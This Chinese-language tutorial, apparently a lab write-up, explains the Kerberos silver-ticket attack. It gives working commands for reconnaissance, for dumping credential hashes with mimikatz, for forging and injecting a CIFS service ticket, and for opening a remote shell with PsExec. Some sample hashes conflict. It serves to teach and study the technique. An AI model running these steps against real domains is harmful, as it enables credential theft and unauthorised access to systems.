0x00 前言

白银票据（SILVER TICKET）是利用域的服务账户进行伪造的ST，在Kerberos认证的第三步，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后，通过自己的Master Key 解密ST，从而获得 Session Key。

Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问server上的指定服务了。所以只需要知道Server用户的Hash就可以伪造出一个ST，且不会经过KDC，但是伪造的门票只对部分服务起作用（不需要交互KDC，需要知道Server的NTLM Hash）。


前提：

1、已经拿下域管理员，获取到hash；

2、利用administrator的hash制作白银票据，进行攻击。


0x01 前置条件


1、域名：net time

    win-2008dc.god.com


2、域SID：

>whoami /user

>whoami /all

>wmic useraccount get name,sid


3、伪造用户：test（任意用户）

Win-2008-1$

NTLM：48a6afebc57c757c1442dfe3403865ef

//目标主机名Win-2008-1$下的NTLM


4、主密钥：Win2008$

NTLM：48a6afebc57c757c1442dfe3403865ef

//目标主机名$下的NTLM：WIN2008$

5、当前权限为本机管理员（administrator）


0x02 本地测试

1、获取域控的名称

net time



2、获取域的sid

whoami /all
//S-1-5-21-676000920-1652552181-3322320025


3、获取Server NT hash

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > 1.txt//08927c70a1dd33d89d0fc522379a34f9


4、伪造白银票据并导入票据

mimikatz.exe "kerberos::golden /user:test /domain:god.com /sid:S-1-5-21-676000920-1652552181-3322320025 /target:win-2008dc.god.com /service:cifs /rc4:08927c70a1dd33d89d0fc522379a34f9 /ptt" exit


参数：

domain：域名

sid：域环境下的SID，除去最后-的部分剩下的内容

target：要访问的服务器，写FQDN

rc4：写的是目标主机的NTLM（主机名$对应NTLM）

service：要访问的资源类型

user：伪造的用户

cifs：共享文件


5、利用psexec执行命令，调用cmd

PsExec.exe \\win-2008dc.god.com cmd.exe



0x03 总结

1、伪造的ST，只能访问指定的服务，如CIFS；

2、不与KDC交互，直接访问Server；

3、ST由服务账号 NTLM Hash 加密。
